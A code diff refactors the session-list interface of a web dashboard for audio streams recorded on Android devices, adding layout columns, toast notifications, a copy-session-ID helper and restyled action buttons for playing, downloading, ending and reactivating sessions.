@@ -72,13 +72,16 @@ const ui = {
     btnRemoteStop: document.getElementById('btn-remote-stop'),
     remoteClientSelect: document.getElementById('remote-client-select'),
     
-    // View tabs
+    // View tabs & layout columns
     tabAll: document.getElementById('tab-all'),
     tabPlayer: document.getElementById('tab-player'),
     tabDashboard: document.getElementById('tab-dashboard'),
     secPlayer: document.getElementById('sec-player'),
     secDashboard: document.getElementById('sec-dashboard'),
+    colLeft: document.getElementById('col-left'),
+    colRight: document.getElementById('col-right'),
     gridContainer: document.getElementById('grid-container'),
+    toastContainer: document.getElementById('toast-container'),
     
     // Modal
     modalOverlay: document.getElementById('modal-overlay'),
@@ -209,18 +212,22 @@ function setViewMode(mode) {
 
     if (mode === 'all') {
         ui.tabAll.classList.add('active');
-        ui.secPlayer.style.display = 'flex';
-        ui.secDashboard.style.display = 'flex';
-        ui.gridContainer.style.gridTemplateColumns = '1fr 1fr';
+        if (ui.colLeft) ui.colLeft.style.display = 'flex';
+        if (ui.colRight) ui.colRight.style.display = 'flex';
+        if (window.innerWidth > 1024) {
+            ui.gridContainer.style.gridTemplateColumns = 'minmax(380px, 460px) minmax(520px, 1fr)';
+        } else {
+            ui.gridContainer.style.gridTemplateColumns = '1fr';
+        }
     } else if (mode === 'player') {
         ui.tabPlayer.classList.add('active');
-        ui.secPlayer.style.display = 'flex';
-        ui.secDashboard.style.display = 'none';
+        if (ui.colLeft) ui.colLeft.style.display = 'flex';
+        if (ui.colRight) ui.colRight.style.display = 'none';
         ui.gridContainer.style.gridTemplateColumns = '1fr';
     } else if (mode === 'dashboard') {
         ui.tabDashboard.classList.add('active');
-        ui.secPlayer.style.display = 'none';
-        ui.secDashboard.style.display = 'flex';
+        if (ui.colLeft) ui.colLeft.style.display = 'none';
+        if (ui.colRight) ui.colRight.style.display = 'flex';
         ui.gridContainer.style.gridTemplateColumns = '1fr';
     }
 }
@@ -539,43 +546,85 @@ function renderSessionsList() {
 
         return `
             <li class="session-card session-card--${statusClass}">
-                <div class="session-card__top">
-                    <div>
-                        <div class="session-card__title">
-                            ${client}
-                            <span class="badge badge--${statusClass}">${badgeText}</span>
-                        </div>
-                        <div class="session-card__meta">
-                            <span title="Full Session ID: ${s.session_id}">🆔 ID: <code style="background: rgba(255,255,255,0.1); padding: 1px 5px; border-radius: 4px; font-family: monospace; user-select: all;">${s.session_id}</code></span>
-                            <span>📱 ${s.device_info || 'Android Device'}</span>
-                            <span>⏱ ${duration}</span>
-                            <span>📦 ${s.total_chunks || 0} chunks</span>
-                            <span>💾 ${sizeStr}</span>
-                            <span>📅 ${dateStr}</span>
+                <!-- Card Header -->
+                <div class="session-card__header">
+                    <div class="session-card__device">
+                        <div class="device-icon ${isLive ? 'device-icon--live' : ''}">📱</div>
+                        <div class="device-details">
+                            <div class="session-card__title">
+                                <span class="client-name">${client}</span>
+                                <span class="badge badge--${statusClass}">${badgeText}</span>
+                                ${isLive ? `<span class="live-ping-dot" title="Streaming Live"></span>` : ''}
+                            </div>
+                            <div class="device-sub">${s.device_info || 'Android Device'}</div>
                         </div>
                     </div>
-                    <div class="session-card__actions" style="margin-top: 6px;">
-                        <button class="icon-btn" title="Pro Web Downloader" onclick="openDownloaderModal('${hlsUrl}')" style="background: rgba(100, 255, 218, 0.1); color: #64ffda; border-color: #64ffda;">
-                            🚀 Pro Download
+
+                    <div class="session-card__quick-play">
+                        <button class="btn-quick-play ${isLive ? 'btn-quick-play--live' : ''}" onclick="loadSession('${s.session_id}')" title="Listen in Live Player">
+                            ▶ ${isLive ? 'Listen Live' : 'Play Recording'}
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Metadata Chips Bar -->
+                <div class="session-card__meta-bar">
+                    <div class="meta-chip" title="Total Duration">
+                        <span class="meta-chip__icon">⏱️</span>
+                        <span class="meta-chip__val">${duration}</span>
+                    </div>
+                    <div class="meta-chip" title="Total Chunks Recorded">
+                        <span class="meta-chip__icon">📦</span>
+                        <span class="meta-chip__val">${(s.total_chunks || 0).toLocaleString()} chunks</span>
+                    </div>
+                    <div class="meta-chip" title="Audio Data Size">
+                        <span class="meta-chip__icon">💾</span>
+                        <span class="meta-chip__val">${sizeStr}</span>
+                    </div>
+                    <div class="meta-chip" title="Session Started (IST)">
+                        <span class="meta-chip__icon">📅</span>
+                        <span class="meta-chip__val">${dateStr}</span>
+                    </div>
+                    <div class="meta-chip meta-chip--id" onclick="copySessionId('${s.session_id}')" title="Click to copy full Session UUID">
+                        <span class="meta-chip__icon">🆔</span>
+                        <code class="meta-chip__code">${shortId}...</code>
+                        <span class="meta-chip__copy">📋</span>
+                    </div>
+                </div>
+
+                <!-- Actions Toolbar -->
+                <div class="session-card__toolbar">
+                    <div class="action-group-primary">
+                        <button class="action-btn action-btn--pro" onclick="openDownloaderModal('${hlsUrl}')" title="High-Speed Segment Downloader & Stitcher">
+                            <span class="action-btn__icon">🚀</span>
+                            <span>Pro Download</span>
+                        </button>
+                        <a href="${downloadUrl}" target="_blank" class="action-btn action-btn--audio" title="Download Combined Audio Recording">
+                            <span class="action-btn__icon">📥</span>
+                            <span>Download Audio</span>
+                        </a>
+                        <a href="${chunkZipUrl}" target="_blank" class="action-btn action-btn--zip" title="Download All Raw Chunks as ZIP">
+                            <span class="action-btn__icon">🗜️</span>
+                            <span>Chunks ZIP</span>
+                        </a>
+                    </div>
+
+                    <div class="action-group-secondary">
+                        <button class="action-btn action-btn--ghost" onclick="copyHlsLink('${hlsUrl}')" title="Copy HLS Stream URL">
+                            <span class="action-btn__icon">🔗</span>
+                            <span>Copy Link</span>
                         </button>
                         ${isLive ? `
-                        <button class="icon-btn" title="End this session to force rotation" onclick="endLiveSession('${s.session_id}')" style="background: rgba(255, 171, 0, 0.15); color: #ffab00; border-color: #ffab00;">
-                            ⏹️ End Session
+                        <button class="action-btn action-btn--warning" onclick="endLiveSession('${s.session_id}')" title="End this session & rotate">
+                            <span class="action-btn__icon">⏹️</span>
+                            <span>End Session</span>
                         </button>` : `
-                        <button class="icon-btn" title="Reactivate session as LIVE" onclick="activateSession('${s.session_id}')" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border-color: #10b981;">
-                            ▶️ Make Live
+                        <button class="action-btn action-btn--reactivate" onclick="activateSession('${s.session_id}')" title="Reactivate this session as LIVE">
+                            <span class="action-btn__icon">🔄</span>
+                            <span>Make Live</span>
                         </button>`}
-                        <button class="icon-btn" title="Copy HLS VOD Stream Link" onclick="copyHlsLink('${hlsUrl}')">
-                            📋 Copy Link
-                        </button>
-                        <a href="${downloadUrl}" target="_blank" class="icon-btn" title="Download Audio Recording">
-                            📥 Download Audio
-                        </a>
-                        <a href="${chunkZipUrl}" target="_blank" class="icon-btn" title="Download Raw Chunks ZIP">
-                            🗜️ Download Chunks ZIP
-                        </a>
-                        <button class="icon-btn icon-btn--danger" title="Delete Session" onclick="openDeleteModal('${s.session_id}')">
-                            🗑️
+                        <button class="action-btn action-btn--danger" onclick="openDeleteModal('${s.session_id}')" title="Delete Session">
+                            <span class="action-btn__icon">🗑️</span>
                         </button>
                     </div>
                 </div>
@@ -585,13 +634,41 @@ function renderSessionsList() {
 }
 
 // ════════════════════════════════════════════════════════════════════════════
-// MODAL & HELPERS
+// MODAL & HELPERS & TOASTS
 // ════════════════════════════════════════════════════════════════════════════
+
+function showToast(msg, type = 'info') {
+    if (!ui.toastContainer) return;
+    const toast = document.createElement('div');
+    toast.className = `toast toast--${type}`;
+    let icon = 'ℹ️';
+    if (type === 'success') icon = '✅';
+    else if (type === 'error') icon = '⚠️';
+    toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
+    ui.toastContainer.appendChild(toast);
+    requestAnimationFrame(() => toast.classList.add('show'));
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 300);
+    }, 2800);
+}
+
+function copySessionId(id) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(id).then(() => {
+            showToast(`Copied Session ID: ${id.slice(0, 8)}...`, 'success');
+        }).catch(() => {
+            prompt('Copy Session ID:', id);
+        });
+    } else {
+        prompt('Copy Session ID:', id);
+    }
+}
 
 function copyHlsLink(url) {
     if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(url).then(() => {
-            alert('Copied HLS Link to clipboard:\n' + url);
+            showToast('Copied HLS Link to clipboard!', 'success');
         }).catch(() => {
             prompt('Copy HLS Stream Link:', url);
         });
@@ -605,14 +682,14 @@ async function endLiveSession(sessionId) {
     try {
         const res = await fetch(`/api/v1/broadcasts/${sessionId}/end`, { method: 'PUT' });
         if (res.ok) {
-            alert('✓ Session marked as ended. A new session will be created.');
+            showToast('Session ended. Device will rotate to a new session.', 'success');
             fetchAllData();
         } else {
             const err = await res.json();
-            alert('Error: ' + (err.message || 'Failed to end session'));
+            showToast(err.message || 'Failed to end session', 'error');
         }
     } catch (e) {
-        alert('Network error: ' + e.message);
+        showToast('Network error: ' + e.message, 'error');
     }
 }
 
@@ -620,22 +697,22 @@ async function activateSession(sessionId) {
     try {
         const res = await fetch(`/api/v1/broadcasts/${sessionId}/activate`, { method: 'PUT' });
         if (res.ok) {
-            alert('✓ Session reactivated as LIVE!');
+            showToast('Session reactivated as LIVE!', 'success');
             fetchAllData();
         } else {
             const err = await res.json();
-            alert('Error: ' + (err.message || 'Failed to reactivate session'));
+            showToast(err.message || 'Failed to reactivate session', 'error');
         }
     } catch (e) {
-        alert('Network error: ' + e.message);
+        showToast('Network error: ' + e.message, 'error');
     }
 }
 
 function openDownloaderModal(url) {
     const iframe = document.getElementById('downloader-iframe');
     const overlay = document.getElementById('modal-downloader-overlay');
-    if(iframe && overlay) {
-        iframe.src = `/downloader.html?url=\${encodeURIComponent(url)}`;
+    if (iframe && overlay) {
+        iframe.src = `/downloader.html?url=${encodeURIComponent(url)}`;
         overlay.classList.add('active');
     }
 }
